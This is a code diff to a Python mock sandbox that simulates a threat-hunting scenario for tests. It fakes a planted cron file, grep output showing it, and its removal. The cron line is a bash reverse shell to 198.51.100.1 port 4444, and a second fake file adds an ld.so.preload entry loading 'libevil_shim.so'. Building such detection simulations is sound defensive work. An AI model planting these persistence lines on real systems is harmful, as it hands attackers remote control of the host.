@@ -216,7 +216,46 @@ class MockSandbox(BaseSandbox):
                 command=command, exit_code=0, stdout="-P OUTPUT ACCEPT\n", stderr=""
             )
 
-        # 9. Generic echo redirection and file removal
+        # 9. Threat hunting & persistence operations
+        if "backdoor_persist" in cmd_clean and (
+            "cat <<" in cmd_clean or "echo " in cmd_clean or "touch " in cmd_clean
+        ):
+            self.files["/etc/cron.d/backdoor_persist"] = (
+                '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/198.51.100.1/4444 0>&1"\n'
+            )
+        if ("libevil_shim" in cmd_clean or "ld.so.preload" in cmd_clean) and (
+            "echo " in cmd_clean or "touch " in cmd_clean
+        ):
+            self.files["/etc/ld.so.preload"] = "/lib/x86_64-linux-gnu/libevil_shim.so\n"
+
+        if ("backdoor_persist" in cmd_clean or "libevil_shim" in cmd_clean) and (
+            "cat <<" in cmd_clean or "echo " in cmd_clean or "touch " in cmd_clean
+        ):
+            return ExecutionResult(command=command, exit_code=0, stdout="", stderr="")
+
+        if "grep" in cmd_clean and (
+            "/etc/cron" in cmd_clean or "crontab" in cmd_clean or "cron" in cmd_clean
+        ):
+            if "/etc/cron.d/backdoor_persist" in self.files:
+                return ExecutionResult(
+                    command=command,
+                    exit_code=0,
+                    stdout="/etc/cron.d/backdoor_persist:2:* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.1/4444 0>&1'\n",
+                    stderr="",
+                )
+            return ExecutionResult(command=command, exit_code=0, stdout="", stderr="")
+
+        if "test -f /etc/cron.d/backdoor_persist" in cmd_clean:
+            if "/etc/cron.d/backdoor_persist" in self.files:
+                return ExecutionResult(command=command, exit_code=0, stdout="", stderr="")
+            return ExecutionResult(command=command, exit_code=1, stdout="", stderr="")
+
+        if cmd_clean.startswith("rm ") or "rm -f" in cmd_clean:
+            for p in ["/etc/cron.d/backdoor_persist", "/etc/ld.so.preload"]:
+                if p in cmd_clean:
+                    self.files.pop(p, None)
+
+        # 10. Generic echo redirection and file removal
         if "echo " in cmd_clean and (">>" in cmd_clean or " > " in cmd_clean):
             delim = ">>" if ">>" in cmd_clean else " > "
             parts = cmd_clean.split(delim, 1)
@@ -331,7 +370,7 @@ class MockSandbox(BaseSandbox):
                 command=command, exit_code=0, stdout="1024\n2048\n4096\n", stderr=""
             )
 
-        # 12. File reading
+        # 13. File reading
         if cmd_clean.startswith("cat "):
             path = cmd_clean.split("cat ", 1)[1].strip().strip("'").strip('"')
             path = path.split(" 2>")[0].strip()
